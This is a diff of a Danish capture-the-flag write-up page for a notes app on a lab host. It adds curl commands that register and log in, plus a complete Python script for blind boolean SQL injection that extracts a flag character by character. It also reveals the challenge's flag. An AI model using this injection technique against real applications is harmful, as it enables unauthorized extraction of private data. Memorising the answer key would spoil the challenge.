@@ -26,13 +26,53 @@
 <p>En notes-app (<code>hackable2.hkn</code>) med <code>/guessnotes</code> ("guess a private note of a
              given user", felter <code>user_name</code>+<code>note</code>, svar "Good Guess"/"Bad Guess"). "Blind
              guesses" = blind boolean SQLi (SQLite).</p>
+<h2>Opret en konto først</h2>
+<p>Appen kræver login. <code>/guessnotes</code>s <code>user_name</code>-felt skal matche en
+             <strong>eksisterende</strong> bruger, ellers kortslutter logikken før din injektion overhovedet når
+             query'en, så registrér dig og brug dit eget brugernavn som ankeret:</p>
+             <pre><code>curl -c cookies.txt -d 'username=pwntester&amp;password=test123' http://hackable2.hkn/register
+curl -b cookies.txt -c cookies.txt -d 'username=pwntester&amp;password=test123' http://hackable2.hkn/login</code></pre>
 <h2>Exploit</h2>
-<p>Query'en er ca. <code>... WHERE user_name='&lt;user&gt;' AND note='&lt;note&gt;'</code>. Injicér i
-             <code>note</code> med et <strong>eksisterende</strong> user_name (ellers kortslutter logikken):</p>
-             <pre><code>user_name=&lt;rigtig-bruger&gt;  note=zzz' OR (&lt;condition&gt;) --    # "Good Guess" hvis sand</code></pre>
-             <p>Lokalisér flaget og ekstrahér det tegn-for-tegn (binær søgning, ~7 req/tegn):</p>
-             <pre><code>SUB="(SELECT note FROM notes WHERE note LIKE '%HKN{%' LIMIT 1)"
-# length(SUB)>mid ; unicode(substr(SUB,i,1))>mid  -> rekonstruér flaget</code></pre>
+<p>Query'en bag <code>/guessnotes</code> er ca. <code>... WHERE user_name='&lt;user&gt;' AND
+             note='&lt;note&gt;'</code>. Injicér i <code>note</code>-feltet med dit eget (ægte) brugernavn i
+             <code>user_name</code>:</p>
+             <pre><code>user_name=pwntester  note=zzz' OR (&lt;condition&gt;) --    # "Good Guess" hvis condition er sand</code></pre>
+             <p>Bekræft først at flaget overhovedet er en note:
+             <code>(SELECT 1 FROM notes WHERE note LIKE '%HKN{%')</code> → "Good Guess" bekræfter det. Ekstrahér
+             det derefter tegn-for-tegn med binær søgning (~7 requests pr. tegn, fordi ASCII er 7 bit):</p>
+             <pre><code>import requests
+
+S = requests.Session()
+S.post("http://hackable2.hkn/register", data={"username": "pwntester", "password": "test123"})
+S.post("http://hackable2.hkn/login", data={"username": "pwntester", "password": "test123"})
+SUB = "(SELECT note FROM notes WHERE note LIKE '%HKN{%' LIMIT 1)"
+
+def ask(condition):
+    note = f"zzz' OR ({condition}) --"
+    r = S.post("http://hackable2.hkn/guessnotes", data={"user_name": "pwntester", "note": note})
+    return "Good Guess" in r.text
+
+# find flagets længde med binær søgning
+lo, hi = 0, 128
+while lo &lt; hi:
+    mid = (lo + hi) // 2
+    if ask(f"length({SUB}) &gt; {mid}"):
+        lo = mid + 1
+    else:
+        hi = mid
+length = lo
+
+flag = ""
+for i in range(1, length + 1):
+    lo, hi = 0, 127
+    while lo &lt; hi:
+        mid = (lo + hi) // 2
+        if ask(f"unicode(substr({SUB},{i},1)) &gt; {mid}"):
+            lo = mid + 1
+        else:
+            hi = mid
+    flag += chr(lo)
+    print(flag)</code></pre>
 <details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
 <p>Flag: <span class="flag">HKN{p4ran0ia_mak3s_y0u_go0d_a7_gue5s1ng_g4me5}</span></p>
 </details>
